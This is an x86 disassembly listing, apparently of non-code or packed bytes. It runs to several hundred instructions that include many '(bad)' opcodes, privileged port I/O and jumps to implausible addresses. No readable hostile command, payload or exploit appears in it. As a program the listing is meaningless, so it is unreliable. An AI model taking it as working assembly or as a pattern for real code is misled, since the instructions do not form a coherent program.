  41fabc:	out    0xef,al
  41fabe:	jmp    0x47b3b59e
  41fac3:	pop    edx
  41fac4:	outs   dx,BYTE PTR ds:[esi]
  41fac5:	xchg   edx,eax
  41fac6:	loop   0x41fa64
  41fac8:	es pop ds
  41faca:	stos   BYTE PTR es:[edi],al
  41facb:	pushf  
  41facc:	ficom  WORD PTR [ebx+0x301de826]
  41fad2:	pop    esp
  41fad3:	(bad)  
  41fad4:	into   
  41fad5:	cmp    eax,0x73a2f8d7
  41fada:	mov    esi,0xb8ef4226
  41fadf:	sbb    al,0xd7
  41fae1:	(bad)  
  41fae2:	bound  eax,QWORD PTR [esi]
  41fae4:	jae    0x41fb4b
  41fae6:	push   es
  41fae7:	push   es
  41fae8:	retf   0x3150
  41faeb:	inc    esi
  41faec:	push   cs
  41faed:	lahf   
  41faee:	push   0x92677e9b
  41faf3:	push   ecx
  41faf4:	jbe    0x41fb3f
  41faf6:	aaa    
  41faf7:	and    DWORD PTR [ebx],0x93dd5d11
  41fafd:	inc    ebp
  41fafe:	mov    esi,0x446d7542
  41fb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb04:	xor    DWORD PTR [ecx+0xbc4b8a8],esp
  41fb0a:	retf   0x3be4
  41fb0d:	or     BYTE PTR [ebx],ch
  41fb0f:	jp     0x41fa9e
  41fb11:	pushf  
  41fb12:	xlat   BYTE PTR ds:[ebx]
  41fb13:	xor    cl,BYTE PTR [edx-0x6032c04a]
  41fb19:	fnstsw WORD PTR [edx-0x55]
  41fb1c:	leave  
  41fb1d:	mov    WORD PTR [eax],?
  41fb1f:	mov    eax,ds:0xcae07954
  41fb24:	push   DWORD PTR [esi-0x18]
  41fb27:	leave  
  41fb28:	dec    esp
  41fb29:	cli    
  41fb2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb2c:	push   0x429c3e89
  41fb31:	add    DWORD PTR [edi],esp
  41fb33:	cwde   
  41fb34:	arpl   dx,sp
  41fb36:	leave  
  41fb37:	cs add ebx,esp
  41fb3a:	(bad)  
  41fb3b:	popa   
  41fb3c:	xor    ebx,edx
  41fb3e:	ror    BYTE PTR [esi+0x7f],1
  41fb41:	dec    ecx
  41fb42:	sar    DWORD PTR [eax+edx*1],0x27
  41fb46:	mov    gs,ebx
  41fb48:	into   
  41fb49:	mov    esp,0x359d2571
  41fb4e:	ret    0xb23e
  41fb51:	out    dx,eax
  41fb52:	hlt    
  41fb53:	out    0xb3,al
  41fb55:	or     al,0x9d
  41fb57:	test   al,0x26
  41fb59:	and    eax,0x6ed34e2b
  41fb5e:	cli    
  41fb5f:	mov    ah,0xd1
  41fb61:	cmp    DWORD PTR [ebx-0x4793f265],edx
  41fb67:	jns    0x41fb23
  41fb69:	sub    ah,ch
  41fb6b:	or     DWORD PTR ds:0xe2be678c,0xa6e50499
  41fb75:	out    0xdb,al
  41fb77:	jne    0x41fbc2
  41fb79:	inc    eax
  41fb7a:	cmp    al,0x6a
  41fb7c:	dec    esi
  41fb7d:	pop    esp
  41fb7e:	sbb    eax,0x1f2fc32c
  41fb83:	dec    edi
  41fb84:	inc    edx
  41fb85:	fneni(8087 only) 
  41fb87:	sbb    ebp,edx
  41fb89:	stos   BYTE PTR es:[edi],al
  41fb8a:	scas   eax,DWORD PTR es:[edi]
  41fb8b:	test   al,0x64
  41fb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb8e:	add    eax,0x33
  41fb91:	jecxz  0x41fb1f
  41fb93:	inc    edi
  41fb94:	and    eax,0xc09141c7
  41fb99:	lahf   
  41fb9a:	cmp    DWORD PTR [ecx],edi
  41fb9c:	push   DWORD PTR [ecx]
  41fb9e:	int    0x55
  41fba0:	repz jns 0x41fb94
  41fba3:	add    ch,bl
  41fba5:	sub    edi,DWORD PTR [eax-0x5]
  41fba8:	sbb    DWORD PTR [edx],esp
  41fbaa:	lods   eax,DWORD PTR ds:[esi]
  41fbab:	sub    DWORD PTR [ecx-0xd],ebx
  41fbae:	std    
  41fbaf:	dec    esi
  41fbb0:	or     cl,BYTE PTR [ebp+0x78c82879]
  41fbb6:	xchg   ecx,eax
  41fbb7:	jmp    0x41fc25
  41fbb9:	cli    
  41fbba:	out    0xa3,al
  41fbbc:	cmp    dh,ah
  41fbbe:	xor    DWORD PTR [esi-0x2a407356],esp
  41fbc4:	lock sub BYTE PTR [eax],0x5c
  41fbc8:	stc    
  41fbc9:	xchg   esp,eax
  41fbca:	jp     0x41fc2a
  41fbcc:	dec    eax
  41fbcd:	jmp    0x41fb9f
  41fbcf:	mov    dh,0x15
  41fbd1:	push   ecx
  41fbd2:	pop    bx
  41fbd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbd5:	aas    
  41fbd6:	push   ds
  41fbd7:	push   edx
  41fbd8:	pop    eax
  41fbd9:	mov    DWORD PTR ds:0x8bd7621,edx
  41fbdf:	ror    ecx,1
  41fbe1:	inc    ebp
  41fbe2:	fsubr  QWORD PTR [ecx+0x6ce57424]
  41fbe8:	sbb    BYTE PTR [ecx+0x28],dl
  41fbeb:	inc    esi
  41fbec:	sbb    BYTE PTR [esi+0x163c4a9],ch
  41fbf2:	jnp    0x41fbc6
  41fbf4:	in     al,0x6f
  41fbf6:	lock mov dl,0xf4
  41fbf9:	adc    BYTE PTR [esi+0x635f729e],cl
  41fbff:	pop    eax
  41fc00:	adc    esi,esp
  41fc02:	scas   eax,DWORD PTR es:[edi]
  41fc03:	rcr    bl,0xc4
  41fc06:	sbb    ecx,DWORD PTR [ebx-0x37]
  41fc09:	and    al,0xbe
  41fc0b:	rcr    BYTE PTR [ecx+0x1a],1
  41fc0e:	mov    edx,0x931ff1aa
  41fc13:	jnp    0x41fbd2
  41fc15:	push   edi
  41fc16:	push   edx
  41fc17:	inc    esp
  41fc18:	ss mov ebp,0x28ed2a97
  41fc1e:	push   esi
  41fc1f:	nop
  41fc20:	xchg   esp,eax
  41fc21:	lods   al,BYTE PTR ds:[esi]
  41fc22:	cmp    al,BYTE PTR [ecx-0x5011da3c]
  41fc28:	(bad)  
  41fc2b:	jmp    0xe6a4:0xabe34329
  41fc32:	push   esp
  41fc33:	dec    DWORD PTR [ebx+ecx*4-0x462112e5]
  41fc3a:	inc    esp
  41fc3b:	xchg   edx,eax
  41fc3c:	xchg   edi,eax
  41fc3d:	push   esi
  41fc3e:	inc    edx
  41fc3f:	rol    DWORD PTR [ecx-0x6001f2df],0xba
  41fc46:	xor    edi,ebp
  41fc48:	add    eax,DWORD PTR [esi-0x63]
  41fc4b:	jge    0x41fc1e
  41fc4d:	(bad)  
  41fc4e:	mov    edx,0x5bac1e3c
  41fc53:	pop    ebx
  41fc54:	or     ecx,DWORD PTR [ecx-0x40]
  41fc57:	dec    eax
  41fc58:	(bad)  
  41fc59:	mov    al,ds:0xd3d03c9e
  41fc5e:	pop    esp
  41fc5f:	scas   eax,DWORD PTR es:[edi]
  41fc60:	hlt    
  41fc61:	aam    0x1a
  41fc63:	push   ecx
  41fc64:	cli    
  41fc65:	sar    DWORD PTR [ebx-0x1408ad33],0xf2
  41fc6c:	loope  0x41fc4a
  41fc6e:	mov    ebp,0xf10349ed
  41fc73:	loopne 0x41fcf2
  41fc75:	adc    BYTE PTR [esi-0x29],dl
  41fc78:	cld    
  41fc79:	or     bl,BYTE PTR [eax+0x674582c9]
  41fc7f:	sub    bl,bh
  41fc81:	cmp    al,0x3c
  41fc83:	mov    ds:0x3fc03968,eax
  41fc88:	add    DWORD PTR [ebp-0x38],0xffffffc2
  41fc8c:	jns    0x41fd06
  41fc8e:	push   esp
  41fc8f:	aaa    
  41fc90:	je     0x41fcca
  41fc92:	cmp    DWORD PTR [edx-0x23],eax
  41fc95:	sbb    esp,eax
  41fc97:	pop    ebx
  41fc98:	add    esp,esp
  41fc9a:	push   ebx
  41fc9b:	fist   DWORD PTR [ebp+0x6d]
  41fc9e:	mov    ebx,0xaee1345d
  41fca3:	fist   DWORD PTR [ebp-0xb]
  41fca6:	(bad)
  41fca9:	xor    DWORD PTR [edx+0x14ca57e],eax
  41fcaf:	rcl    BYTE PTR [ebx],cl
  41fcb1:	es inc edi
  41fcb3:	sbb    al,0x7b
  41fcb5:	mov    ebx,0x5fbde574
  41fcba:	push   esp
  41fcbb:	xchg   ebp,eax
  41fcbc:	add    ch,BYTE PTR [ecx]
  41fcbe:	inc    esp
  41fcbf:	(bad)  
  41fcc0:	out    dx,al
  41fcc1:	out    0xa,eax
  41fcc3:	call   0xc93f22ac
  41fcc8:	push   ss
  41fcc9:	stos   BYTE PTR es:[edi],al
  41fcca:	outs   dx,DWORD PTR ds:[esi]
  41fccb:	add    edx,edx
  41fccd:	scas   eax,DWORD PTR es:[edi]
  41fcce:	clc    
  41fccf:	xchg   ebp,eax
  41fcd0:	dec    esp
  41fcd1:	(bad)  
  41fcd2:	jle    0x41fcc8
  41fcd4:	aaa    
  41fcd5:	adc    BYTE PTR [edx],cl
  41fcd7:	aas    
  41fcd8:	call   0xfa4abb1a
  41fcdd:	mov    ecx,0xcb2e0e54
  41fce2:	xor    al,BYTE PTR [ebp-0x78b979c7]
  41fce8:	pushf  
  41fce9:	sub    eax,0xd4ea6e19
  41fcee:	out    dx,eax
  41fcef:	(bad)  
  41fcf0:	cmp    al,0x5c
  41fcf2:	pop    ss
  41fcf3:	outs   dx,DWORD PTR ds:[esi]
  41fcf4:	add    DWORD PTR [ecx],esp
  41fcf6:	out    dx,al
  41fcf7:	push   0x34e00980
  41fcfc:	sbb    dh,dl
  41fcfe:	cmc    
  41fcff:	in     eax,0x84
  41fd01:	ret    
  41fd02:	pop    esp
  41fd03:	or     dl,BYTE PTR [edx]
  41fd05:	adc    al,0x6
  41fd07:	test   DWORD PTR [edi+0x94],ebp
	...
  41fee1:	add    BYTE PTR [esi-0x8131a83],cl
  41fee7:	cld    
  41fee8:	(bad)  
  41fee9:	jg     0x41ff5d
  41feeb:	and    eax,0xb4fb1474
  41fef0:	mov    ds,WORD PTR [edx+ebx*2-0x3a]
  41fef4:	add    DWORD PTR [eax],eax
  41fef6:	and    eax,0x75000007
  41fefb:	xchg   ebp,eax
  41fefc:	xchg   esp,edi
  41fefe:	mov    BYTE PTR [esi-0x74],ah
  41ff01:	jbe    0x41fe88
  41ff03:	dec    edi
  41ff04:	inc    edi
  41ff05:	jmp    0xf41d:0x4b284503
  41ff0c:	mov    dh,0x84
  41ff0e:	jecxz  0x41ff74
  41ff10:	or     ecx,edx
  41ff12:	push   ebx
  41ff13:	xchg   esi,eax
  41ff14:	pop    ebx
  41ff15:	repz lock pop eax
  41ff18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff19:	(bad)  
  41ff1a:	and    eax,0x8826ade9
  41ff1f:	(bad)  
  41ff20:	xor    esi,edi
  41ff22:	out    dx,eax
  41ff23:	jns    0x41fef0
  41ff25:	ret    
  41ff26:	jmp    0x41fece
  41ff28:	ins    BYTE PTR es:[edi],dx
  41ff29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff2a:	enter  0xf203,0x1b
  41ff2e:	add    bh,bh
  41ff30:	out    dx,al
  41ff31:	out    dx,al
  41ff32:	retf   0x669f
  41ff35:	gs jg  0x41ff3f
  41ff38:	ds fstp st(3)
  41ff3b:	jmp    0x9f67270d
  41ff40:	addr16 sub dh,cl
  41ff43:	mov    ds:0x70190842,al
  41ff48:	cmp    DWORD PTR [esp+ebp*4],0x72
  41ff4c:	js     0x41fed0
  41ff4e:	push   0xfffffff2
  41ff50:	or     bl,ah
  41ff52:	jnp    0x41fee4
  41ff54:	loopne 0x41ff6f
  41ff56:	test   DWORD PTR [esi+0x76ec83bd],eax
  41ff5c:	mov    ah,0xf5
  41ff5e:	in     al,dx
  41ff5f:	push   cs
  41ff60:	imul   esi,ebx,0xffffffdf
  41ff63:	fcmovu st,st(5)
  41ff65:	and    al,0x9e
  41ff67:	jo     0x41ff5d
  41ff69:	add    dl,BYTE PTR [esp+ebp*1]
  41ff6c:	jne    0x41ff1f
  41ff6e:	shr    BYTE PTR cs:[edx+0x3f],1
  41ff72:	sahf   
  41ff73:	inc    esp
  41ff74:	sahf   
  41ff75:	daa    
  41ff76:	xlat   BYTE PTR es:[ebx]
  41ff78:	sbb    eax,0x68c65ad1
  41ff7d:	pusha  
  41ff7e:	test   DWORD PTR [ebx],ebp
  41ff80:	mov    bl,0xf6
  41ff82:	jp     0x41ff2c
  41ff84:	fwait
  41ff85:	(bad)  
  41ff86:	fdivr  DWORD PTR [esi]
  41ff88:	push   ecx
  41ff89:	sahf   
  41ff8a:	aam    0xe8
  41ff8c:	inc    eax
  41ff8d:	dec    ebx
  41ff8e:	jge    0x41ff42
  41ff90:	pop    DWORD PTR [ebx-0xa28709f]
  41ff96:	outs   dx,BYTE PTR ds:[esi]
  41ff97:	ret    0x6c4f
  41ff9a:	test   al,0x8c
  41ff9c:	nop
  41ff9d:	add    ah,BYTE PTR [edx+0x48]
  41ffa0:	sbb    al,0xe0
  41ffa2:	mov    esp,DWORD PTR [ecx-0x5439adca]
  41ffa8:	dec    esp
  41ffa9:	jmp    0x41ff8a
  41ffab:	in     eax,dx
  41ffac:	div    BYTE PTR [esi]
  41ffae:	mov    esi,0xd682c96c
  41ffb3:	cmp    DWORD PTR [eax+0x7127c4c8],esi
  41ffb9:	add    BYTE PTR [ebp+0x65],cl
  41ffbc:	and    al,0x27
  41ffbe:	add    al,0x32
  41ffc0:	or     al,0x5e
  41ffc2:	add    cl,dl
  41ffc4:	dec    ebp
  41ffc5:	fild   DWORD PTR [ebp+0x31]
  41ffc8:	mov    ds,WORD PTR [ecx]
  41ffca:	push   edx
  41ffcb:	lods   al,BYTE PTR ds:[esi]
  41ffcc:	xchg   esi,eax
  41ffcd:	push   ds
  41ffce:	test   BYTE PTR ds:0x1400a8c1,bh
  41ffd4:	sub    edi,DWORD PTR [ecx+0x7f]
  41ffd7:	inc    edx
  41ffd8:	fcomp  DWORD PTR [ebx-0x612284d5]
  41ffde:	dec    ebp
  41ffdf:	mov    esp,0xd17c253b
  41ffe4:	ror    DWORD PTR [edx+0x4566a20a],0xe2
  41ffeb:	jns    0xe1a397a
  41fff1:	push   es
  41fff2:	pop    edx
  41fff3:	lea    esp,[ecx+edx*2]
  41fff6:	test   al,0x7e
  41fff8:	popf   
  41fff9:	mov    edx,0x751a0161
  41fffe:	xchg   edx,eax
  41ffff:	add    esi,DWORD PTR [esp+eax*4]
  420002:	or     ecx,DWORD PTR [edx+0x41e2834e]
  420008:	adc    eax,0x33400494
  42000d:	mov    ebx,0xeb03a9a3
  420012:	add    al,BYTE PTR [ecx-0x6df1353f]
  420018:	ret    
  420019:	dec    edi
  42001a:	stos   BYTE PTR es:[edi],al
  42001b:	out    0x0,al
  42001d:	fidivr DWORD PTR [edx+0x63]
  420020:	add    al,ah
  420022:	lods   al,BYTE PTR ds:[esi]
  420023:	xor    eax,0x7c1d556b
  420028:	and    ecx,ebx
  42002a:	push   ebx
  42002b:	dec    esp
  42002c:	xchg   edi,eax
  42002d:	sub    DWORD PTR [edx-0x65b32702],0xf2c230f5
  420037:	dec    edx
  420038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420039:	push   ebx
  42003a:	sub    eax,DWORD PTR [esi+0xc07dcf0]
  420040:	push   0xc1d7b257
  420045:	js     0x420044
  420047:	stos   DWORD PTR es:[edi],eax
  420048:	popf   
  420049:	pop    esp
  42004a:	jae    0x420078
  42004c:	iret   
  42004d:	aaa    
  42004e:	shr    DWORD PTR [ecx],0x7d
  420051:	aaa    
  420052:	mov    eax,ds:0x63674809
  420057:	xor    BYTE PTR [ebx+0x2d4dad15],ch
  42005d:	nop
  42005e:	push   ebx
  42005f:	sub    eax,0x97d1c3ae
  420064:	adc    al,0xb9
  420066:	mov    ebp,DWORD PTR [ebp-0x19]
  420069:	jmp    0x47b9a59d
  42006e:	add    BYTE PTR [edx],dl
  420070:	nop
  420071:	out    dx,al
  420072:	xchg   ecx,eax
  420073:	test   BYTE PTR [edi+0x2e6025ae],ch
  420079:	lods   eax,DWORD PTR ds:[esi]
  42007a:	not    BYTE PTR [ecx+0x1cea6817]
  420080:	jne    0x4200d9
  420082:	sbb    bh,BYTE PTR [ecx+0x2]
  420085:	cli    
  420086:	shrd   DWORD PTR [ebx+edi*1+0x44e765ed],ebx,cl
  42008e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42008f:	or     dh,ah
  420091:	adc    DWORD PTR [ebp-0x1ee85c2f],esp
  420097:	test   BYTE PTR [esi],0x27
  42009a:	cli    
  42009b:	jg     0x4200c9
  42009d:	in     al,dx
  42009e:	in     al,dx
  42009f:	adc    BYTE PTR [ebp+edx*8-0xcecea8],dl
  4200a6:	call   FWORD PTR [eax-0x7e247f78]
  4200ac:	mov    cl,0x33
  4200ae:	pusha  
  4200af:	pop    edx
  4200b0:	enter  0x98b9,0x1f
  4200b4:	leave  
  4200b5:	xor    eax,0x99558f6a
  4200ba:	pop    esi
  4200bb:	icebp  
  4200bc:	jnp    0x4200cf
  4200be:	mov    ch,0x24
  4200c0:	(bad)  
  4200c1:	lock mov edx,0x33818f5c
  4200c7:	jno    0x4200dc
  4200c9:	sub    ch,BYTE PTR ds:0xee8476d9
  4200cf:	xchg   edi,eax
  4200d0:	inc    ebx
  4200d1:	imul   ebx,ebx,0xffffff88
  4200d4:	inc    ecx
  4200d5:	jmp    0xc2cd5b7d
  4200da:	retf   
  4200db:	pop    esi
  4200dc:	test   eax,0xf230a0b9
  4200e1:	push   edx
  4200e2:	sti    
  4200e3:	xchg   ebx,eax
  4200e4:	sub    BYTE PTR [ecx+0x79],al
  4200e7:	sub    cl,dl
  4200e9:	dec    ebp
  4200ea:	cld    
  4200eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200ec:	push   0x2edcadb1
  4200f1:	dec    ebx
  4200f2:	mov    ds:0x22fa8303,al
  4200f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f8:	push   cs
  4200f9:	pop    esp
  4200fa:	out    0x56,eax
  4200fc:	mov    ah,0x26
  4200fe:	std    
  4200ff:	or     bh,bl
  420101:	pop    eax
  420102:	in     eax,0x31
  420104:	push   ebx
  420105:	dec    ebx
  420106:	add    ah,bl
  420108:	cs dec ebx
  42010a:	mov    WORD PTR [ebx],gs
  42010c:	and    BYTE PTR ds:0xd6452734,bh
  420112:	fdivr  DWORD PTR [esi+0x38]
  420115:	retf   
  420116:	xchg   edx,eax
  420117:	sub    eax,0x899588a6
  42011c:	xchg   esi,eax
  42011d:	add    al,0x8e
  42011f:	lods   al,BYTE PTR ds:[esi]
  420120:	ss mov dl,0xc0
  420123:	push   esi
  420124:	aad    0x1e
  420126:	rcr    BYTE PTR [ebx],cl
  420128:	and    eax,0x274c792c
  42012d:	sbb    BYTE PTR [ebp+ecx*4+0x1d5febc4],ch
  420134:	je     0x42015a
  420136:	out    dx,al
  420137:	sahf   
  420138:	(bad)  
  420139:	sub    al,0xe
  42013b:	pop    es
  42013c:	test   eax,0x29cba50e
  420141:	rol    BYTE PTR [ebx],cl
  420143:	aas    
  420144:	sahf   
  420145:	cmp    BYTE PTR [ebp+0x15],ah
  420148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420149:	sub    esp,eax
  42014b:	or     eax,0xb51ea669
  420150:	pop    es
  420151:	push   ebx
  420152:	jp     0x42012a
  420154:	mov    al,ds:0x1e89eb0d
  420159:	xchg   edi,eax
  42015a:	add    al,0x21
  42015c:	mov    cl,0x34
  42015e:	cs pop esi
  420160:	adc    eax,0xf8fd7e03
  420165:	mov    esp,0xc6e5fd5d
  42016a:	lds    esp,FWORD PTR [ebx+0x79]
  42016d:	or     ecx,DWORD PTR [esi-0x375d3491]
  420173:	fs addr16 dec eax
  420176:	mov    eax,ebp
  420178:	dec    ecx
  420179:	(bad)  
  42017a:	rol    esp,cl
  42017c:	or     esi,DWORD PTR [esi+0x521e9837]
  420182:	fld    DWORD PTR [ebx+0x6e1e342e]
  420188:	bound  esi,QWORD PTR [eax+0x33]
  42018b:	or     edx,ebx
  42018d:	fiadd  WORD PTR [esi-0x3c221ccb]
  420193:	pop    ebx
  420194:	sqrtps xmm1,XMMWORD PTR ss:[ebx-0x76]
  420199:	adc    ebx,DWORD PTR [esi-0x3a42c557]
  42019f:	(bad)  
  4201a0:	fsubr  st(6),st
  4201a2:	dec    DWORD PTR [edi-0x589553dc]
  4201a8:	jo     0x4201a9
  4201aa:	test   BYTE PTR [ecx-0xb],ah
  4201ad:	sub    BYTE PTR [esi],cl
  4201af:	call   0xb608:0x17e5f0db
  4201b6:	add    esi,edx
  4201b8:	call   0x8671ee19
  4201bd:	test   BYTE PTR [esi+eiz*2],0xcf
  4201c1:	mov    cl,0xd9
  4201c3:	add    esp,DWORD PTR [edi]
  4201c5:	and    eax,0xe1baa568
  4201ca:	cmp    DWORD PTR [esi-0x56],0x7c
  4201ce:	fild   DWORD PTR [edi-0x63]
  4201d1:	mov    eax,0xad27d2da
  4201d6:	add    DWORD PTR [eax],0x1b
  4201d9:	mov    ebx,0x25ddcc03
  4201de:	mov    dh,0x2b
  4201e0:	shr    bh,0x49
  4201e3:	sub    BYTE PTR [ebp-0x244a69b],ch
  4201e9:	xor    DWORD PTR [eax-0xbbecf9b],ebp
  4201ef:	test   dh,cl
  4201f1:	repz push edx
  4201f3:	add    dh,BYTE PTR [ebp-0x553ed785]
  4201f9:	hlt    
  4201fa:	pusha  
  4201fb:	(bad)  
  4201fd:	jb     0x4201b1
  4201ff:	pusha  
  420200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420201:	mov    ch,0x16
  420203:	ret    0x1dda
  420206:	xor    dl,BYTE PTR [ebx-0x6cf3c863]
  42020c:	jmp    0x420246
  42020e:	sub    BYTE PTR [edi+0x29],cl
  420211:	outs   dx,DWORD PTR ds:[esi]
  420212:	pop    edx
  420213:	pushf  
  420214:	pop    ds
  420215:	and    esp,DWORD PTR [eax+0x26d2817a]
  42021b:	xchg   esp,eax
  42021c:	push   edi
  42021d:	inc    edx
  42021e:	fidivr DWORD PTR ss:[ebx]
  420221:	nop
  420222:	mov    gs,WORD PTR [eax+0x52319893]
  420228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420229:	lea    esp,[ebx]
  42022b:	out    dx,eax
  42022c:	add    eax,0xde8fe2f6
  420231:	and    eax,0xab14355c
  420236:	sub    ebx,DWORD PTR [esi+0x3e]
  420239:	cmp    edx,DWORD PTR [edx+0x183213e8]
  42023f:	(bad)  
  420240:	mov    DWORD PTR [ebp+eiz*2-0x36be8158],0xa3ec71e6
  42024b:	addr16 clc 
  42024d:	push   ds
  42024e:	push   ss
  42024f:	loop   0x4202ae
  420251:	pop    ecx
  420252:	fisttp WORD PTR ds:0xc173ed27
  420258:	jmp    0x652c:0xb841633
  42025f:	pop    edi
  420260:	push   es
  420261:	(bad)
  420265:	addr16 xchg edi,eax
  420267:	add    BYTE PTR [edx-0x5e5cb0f6],cl
  42026d:	xchg   BYTE PTR [eax+0x5bd26d2b],ch
  420273:	jge    0x6dcbb105
  420279:	cwde   
  42027a:	jno    0x420290
  42027c:	out    0x7a,al
  42027e:	(bad)  
  42027f:	add    bl,BYTE PTR [edx]
  420281:	or     DWORD PTR [ecx],esp
  420283:	call   0x673f:0xe5a36ebe
  42028a:	js     0x42024e
  42028c:	xchg   ecx,eax
  42028d:	in     al,0x52
  42028f:	leave  
  420290:	aam    0xd4
  420292:	ret    
  420293:	jmp    0x42023d
  420295:	xor    al,0xbe
  420297:	les    eax,FWORD PTR [edi]
  420299:	int3   
  42029a:	pushf  
  42029b:	push   esi
  42029c:	xor    DWORD PTR [ebx+0x4b],0x3c
  4202a0:	xor    BYTE PTR [eax+0x4],0xb
  4202a4:	push   esp
  4202a5:	jge    0x420288
  4202a7:	pushf  
  4202a8:	mov    cl,0x62
  4202aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202ab:	and    al,0xf5
  4202ad:	cli    
  4202ae:	in     al,0xa4
  4202b0:	int3   
  4202b1:	leave  
  4202b2:	jmp    0xa0324b02
  4202b7:	cld    
  4202b8:	in     eax,0x90
  4202ba:	fwait
  4202bb:	mov    eax,ds:0xb212c254
  4202c0:	or     al,0x9b
  4202c2:	xor    DWORD PTR [eax],ebx
  4202c4:	push   ecx
  4202c5:	or     ebx,esp
  4202c7:	outs   dx,BYTE PTR ds:[esi]
  4202c8:	dec    eax
  4202c9:	cmp    BYTE PTR [ebp+esi*8-0x68],al
  4202cd:	dec    esi
  4202ce:	xchg   esi,eax
  4202cf:	mov    edi,0x7e6b3413
  4202d4:	jle    0x4202e7
  4202d6:	jl     0x420312
  4202d8:	gs jmp 0x420291
  4202db:	loopne 0x420271
  4202dd:	sbb    edx,eax
  4202df:	dec    esp
  4202e0:	and    BYTE PTR [ebx-0x61],ch
  4202e3:	neg    BYTE PTR [ebp-0x3f20aee8]
  4202e9:	adc    DWORD PTR [eax+0x7f],edx
  4202ec:	(bad)  
  4202ed:	jae    0x4202ce
  4202ef:	mov    esp,0xc33a219b
  4202f4:	fwait
  4202f5:	mov    BYTE PTR [edi],bh
  4202f7:	or     ebx,esi
  4202f9:	jmp    0x82df:0x922597b4
  420300:	stos   BYTE PTR es:[edi],al
  420301:	xor    al,0x28
  420303:	jge    0x4202f7
  420305:	add    al,0xe7
  420307:	inc    ebp
  420308:	and    DWORD PTR [ecx-0x5b386ce1],0x34
  42030f:	jg     0x420319
  420311:	in     al,0xc0
  420313:	pop    ebx
  420314:	rcl    DWORD PTR [ebp+0x21dd4167],0x4a
  42031b:	jg     0x4202c2
  42031d:	ins    DWORD PTR es:[edi],dx
  42031e:	mov    al,ds:0xb0669aee
  420323:	sbb    esi,0xffffffc6
  420326:	(bad)  
  420327:	popa   
  420328:	pop    ebp
  420329:	inc    esp
  42032a:	dec    edi
  42032b:	nop
  42032c:	(bad)  
  42032d:	fist   DWORD PTR [esi]
  42032f:	push   esp
  420330:	mov    ah,0x90
  420332:	clc    
  420333:	jmp    0x7ba8f877
  420338:	jnp    0x4202d6
  42033a:	xchg   BYTE PTR [edx],ch
  42033c:	mov    eax,0x675e89f2
  420341:	(bad)  
  420342:	cmp    esp,DWORD PTR [ecx+0x1b]
  420345:	mov    ebx,0xfe4b795b
  42034a:	lea    edx,[ebp+eax*8+0x27e377bd]
  420351:	int3   
  420352:	adc    ebp,esi
  420354:	mov    edi,0x7667549e
  420359:	in     al,0x4d
  42035b:	xor    ecx,DWORD PTR [eax-0x53]
  42035e:	dec    esi
  42035f:	dec    esi
  420360:	adc    al,0xe5
  420362:	arpl   WORD PTR [ebx],si
  420364:	cmp    eax,0x9c6ef8c7
  420369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42036a:	(bad)  
  42036b:	in     eax,dx
  42036c:	jmp    0x9e839d4d
  420371:	test   al,0x2
  420373:	mov    ch,BYTE PTR [ecx]
  420375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420376:	stc    
  420377:	pop    ds
  420378:	mov    esp,0xe19a013c
  42037d:	mov    al,ds:0x25e186a1
  420382:	pop    edx
  420383:	sbb    bl,BYTE PTR [edi]
  420385:	cmc    
  420386:	jb     0x4203d4
  420388:	mov    ecx,DWORD PTR [ebp+0x1575db7a]
  42038e:	es inc ecx
  420390:	repz aas 
  420392:	jecxz  0x4203c4
  420394:	add    al,0xf0
  420396:	inc    edi
  420397:	mov    bl,BYTE PTR [edi+0x77c17b19]
  42039d:	jmp    0x4203c5
  42039f:	mov    ebx,0x6ede2087
  4203a4:	out    dx,eax
  4203a5:	xchg   esp,eax
  4203a6:	pop    ecx
  4203a7:	mov    ah,0xff
  4203a9:	cmp    al,0x2a
  4203ab:	lock push ebp
  4203ad:	iret   
  4203ae:	jge    0x420408
  4203b0:	sar    DWORD PTR [esi+0x442ab298],0x29
  4203b7:	pop    edi
  4203b8:	fmul   st(4),st
  4203ba:	jo     0x420343
  4203bc:	push   esp
  4203bd:	and    esp,eax
  4203bf:	mov    bh,0x54
  4203c1:	or     DWORD PTR [eax-0x32],ebx
  4203c4:	sub    BYTE PTR [esi+0x4ae599b2],0xa9
  4203cb:	sbb    BYTE PTR [eax+0x258ebd8],0x5a
  4203d2:	loope  0x42036c
  4203d4:	lock push es
  4203d6:	shr    DWORD PTR [edi-0x22],cl
  4203d9:	adc    ebx,ebp
  4203db:	test   eax,0x28247038
  4203e0:	std    
  4203e1:	mov    dl,0x2c
  4203e3:	outs   dx,DWORD PTR ds:[esi]
  4203e4:	repz add ah,BYTE PTR [eax]
  4203e7:	rcl    BYTE PTR [edx-0x429a5d9b],0x18
  4203ee:	ins    BYTE PTR es:[edi],dx
  4203ef:	xor    bl,dh
  4203f1:	mov    esp,0x7ea1e939
  4203f6:	enter  0x6bff,0xe3
  4203fa:	cmp    ch,bh
  4203fc:	or     al,0x4e
  4203fe:	ficomp WORD PTR [ecx+0x627c8870]
  420404:	outs   dx,DWORD PTR ds:[esi]
  420405:	mov    ecx,0xb5b22f02
  42040a:	push   0xffffff8c
  42040c:	mov    edx,0xe139df7
  420411:	push   ds
  420412:	in     al,0xab
  420414:	(bad)  
  420415:	call   DWORD PTR [esi+0x7ed84e9f]
  42041b:	xchg   DWORD PTR ds:0x57714b62,edx
  420421:	mov    ah,0x67
  420423:	sahf   
  420424:	jmp    0xce6f:0x6dd65584
  42042b:	(bad)  
  42042d:	adc    BYTE PTR [ecx+0x3eb6b6fe],0xd2
